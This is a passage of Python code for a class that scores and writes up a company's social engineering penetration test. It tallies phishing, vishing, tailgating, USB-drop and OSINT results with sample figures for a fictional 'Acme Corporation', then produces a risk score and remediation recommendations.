• {self.results['vishing_attempts'].get('success_rate', 0):.1f}% of voice phishing attempts were successful
• {self.results['physical_security'].get('tailgating_success_rate', 0):.1f}% of tailgating attempts succeeded

CRITICAL ACTIONS REQUIRED: {critical_recs} recommendations marked as critical priority

The assessment reveals that {self.company_name} faces {"significant" if risk_level in ["High", "Critical"] else "moderate" if risk_level == "Medium" else "manageable"} 
social engineering risks. Immediate attention should be focused on security awareness training and 
implementation of technical controls to reduce human-factor vulnerabilities.
"""
        return summary
    
    def generate_detailed_report(self):
        """Generate complete assessment report"""
        risk_score = self.calculate_risk_score()
        risk_level = self.get_risk_level(risk_score)
        
        report = f"""
SOCIAL ENGINEERING ASSESSMENT REPORT
===================================

Company: {self.company_name}
Assessment Period: {self.assessment_date.strftime('%B %d, %Y')}
Report Generated: {datetime.now().strftime('%B %d, %Y at %I:%M %p')}

{self.generate_executive_summary()}

DETAILED FINDINGS
================

1. PHISHING CAMPAIGN RESULTS
----------------------------
Emails Sent: {self.results['phishing_campaign'].get('emails_sent', 0)}
Links Clicked: {self.results['phishing_campaign'].get('clicked_links', 0)} ({self.results['phishing_campaign'].get('click_rate', 0):.1f}%)
Credentials Entered: {self.results['phishing_campaign'].get('entered_credentials', 0)} ({self.results['phishing_campaign'].get('credential_rate', 0):.1f}%)
Phishing Reported: {self.results['phishing_campaign'].get('reported_phishing', 0)} ({self.results['phishing_campaign'].get('report_rate', 0):.1f}%)

2. VOICE PHISHING (VISHING) RESULTS
----------------------------------
Calls Made: {self.results['vishing_attempts'].get('calls_made', 0)}
Successful Calls: {self.results['vishing_attempts'].get('successful_calls', 0)} ({self.results['vishing_attempts'].get('success_rate', 0):.1f}%)
Information Types Gathered: {len(self.results['vishing_attempts'].get('information_gathered', []))}

3. PHYSICAL SECURITY TESTING
----------------------------
Tailgating Attempts: {self.results['physical_security'].get('tailgating_attempts', 0)}
Successful Tailgating: {self.results['physical_security'].get('successful_tailgating', 0)} ({self.results['physical_security'].get('tailgating_success_rate', 0):.1f}%)
USB Drops: {self.results['physical_security'].get('usb_drops', 0)}
USB Executions: {self.results['physical_security'].get('usb_executed', 0)} ({self.results['physical_security'].get('usb_execution_rate', 0):.1f}%)

4. OPEN SOURCE INTELLIGENCE (OSINT)
----------------------------------
Employees Identified: {self.results['osint_findings'].get('employees_identified', 0)}
Email Formats Discovered: {len(self.results['osint_findings'].get('email_formats_discovered', []))}
Social Media Profiles: {self.results['osint_findings'].get('social_profiles', 0)}
Leaked Credentials: {self.results['osint_findings'].get('leaked_credentials_found', 0)}

RECOMMENDATIONS
==============
"""
        
        # Sort recommendations by priority
        priority_order = {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3}
        sorted_recommendations = sorted(
            self.results['recommendations'],
            key=lambda x: priority_order.get(x['priority'], 4)
        )
        
        for i, rec in enumerate(sorted_recommendations, 1):
            report += f"""
{i}. {rec['description']} [{rec['priority']} Priority]
   Category: {rec['category']}
   Implementation Effort: {rec['implementation_effort']}
   Timeline: {rec['timeline']}
"""
        
        report += f"""

RISK ASSESSMENT MATRIX
=====================
Overall Risk Score: {risk_score:.1f}/100
Risk Level: {risk_level}

Risk Factor Breakdown:
• Phishing Susceptibility: {self.results['phishing_campaign'].get('click_rate', 0):.1f}%
• Credential Disclosure: {self.results['phishing_campaign'].get('credential_rate', 0):.1f}%
• Voice Social Engineering: {self.results['vishing_attempts'].get('success_rate', 0):.1f}%
• Physical Security: {self.results['physical_security'].get('tailgating_success_rate', 0):.1f}%

CONCLUSION
==========
This assessment demonstrates the current social engineering risk posture of {self.company_name}.
The {risk_level.lower()} risk level indicates {"immediate action is required" if risk_level == "Critical" else "significant improvements are needed" if risk_level == "High" else "moderate improvements are recommended" if risk_level == "Medium" else "the organization has a good security posture but should maintain vigilance"}.

Key focus areas should include security awareness training, implementation of technical controls,
and regular testing to measure improvement over time.

Report prepared by: [Penetration Testing Team]
Next assessment recommended: {(self.assessment_date.replace(year=self.assessment_date.year + 1)).strftime('%B %Y')}
"""
        
        return report
    
    def save_report(self, filename=None):
        """Save report to file"""
        if not filename:
            filename = f"{self.company_name.replace(' ', '_')}_SE_Assessment_{self.assessment_date.strftime('%Y%m%d')}.txt"
        
        report = self.generate_detailed_report()
        
        with open(filename, 'w') as f:
            f.write(report)
        
        print(f"Assessment report saved to: {filename}")
        return filename

# Example usage
if __name__ == "__main__":
    # Create assessment
    assessment = SocialEngineeringAssessment("Acme Corporation")
    
    # Record test results
    assessment.record_phishing_results(
        emails_sent=100,
        clicked_links=45,
        entered_credentials=12,
        reported_phishing=8
    )
    
    assessment.record_vishing_results(
        calls_made=20,
        successful_calls=6,
        information_gathered=['passwords', 'employee_ids', 'personal_info']
    )
    
    assessment.record_physical_security(
        tailgating_attempts=10,
        successful_tailgating=3,
        usb_drops=5,
        usb_executed=2
    )
    
    assessment.record_osint_findings(
        employees_found=150,
        email_formats=['first.last@company.com', 'firstlast@company.com'],
        social_profiles=75,
        leaked_credentials=5
    )
    
    # Add recommendations
    assessment.add_recommendation(
        category="Security Awareness Training",
        priority="Critical",
        description="Implement comprehensive security awareness training program with monthly phishing simulations",
        implementation_effort="Medium"
    )
    
    assessment.add_recommendation(
        category="Email Security",
        priority="High",
        description="Deploy advanced email security solution with link protection and attachment sandboxing",
        implementation_effort="High"
    )
    
    assessment.add_recommendation(
        category="Physical Security",
        priority="Medium",
        description="Implement badge reader system for all entry points and security awareness signage",
        implementation_effort="Medium"
    )
    
    # Generate and save report
    assessment.save_report()
    
    print(f"Risk Score: {assessment.calculate_risk_score():.1f}")
    print(f"Risk Level: {assessment.get_risk_level(assessment.calculate_risk_score())}")
```